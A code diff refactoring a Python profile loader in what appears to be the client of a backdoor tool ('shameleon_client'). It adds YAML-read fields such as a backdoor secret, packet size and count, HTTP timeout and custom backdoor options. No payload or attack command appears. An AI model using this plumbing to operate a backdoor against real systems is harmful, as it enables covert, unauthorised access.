@@ -1,8 +1,8 @@
 from __future__ import annotations
 
-import yaml
+from typing import Any
 
-from shameleon_client.providers.base import ShameleonProvider
+import yaml
 
 
 class Profile:
@@ -19,12 +19,15 @@ class Profile:
 
     def __init__(self, name: str, provider: str, description: str = ''):
         self.name = name
-        self._provider: ShameleonProvider | None = None
-        self._provider_name = provider
+        self.provider_name = provider
         self.description = description
+        # General config
+        self.http_timeout: int = 0
         # Backdoor config
         self.backdoor_secret: str = ''
+        self.backdoor_custom: dict[str, Any] = {}
         self.packet_size: int = 0
+        self.packet_number: int = 0
 
     @classmethod
     def load(cls, file_path: str) -> Profile:
@@ -35,13 +38,9 @@ class Profile:
             provider=data['general']['provider'],
             description=data['general']['description'],
         )
+        profile.http_timeout = data['general']['http_timeout']
         profile.backdoor_secret = data['backdoor']['secret']
         profile.packet_size = data['backdoor']['packet_size']
+        profile.packet_number = data['backdoor']['packet_number']
+        profile.backdoor_custom = data['backdoor'].get('custom', {})
         return profile
-
-    @property
-    def provider(self) -> ShameleonProvider:
-        if self._provider is None:
-            self._provider = ShameleonProvider.get_module_from_name(self._provider_name)(self.backdoor_secret)
-            self._provider.configure(self.packet_size)
-        return self._provider
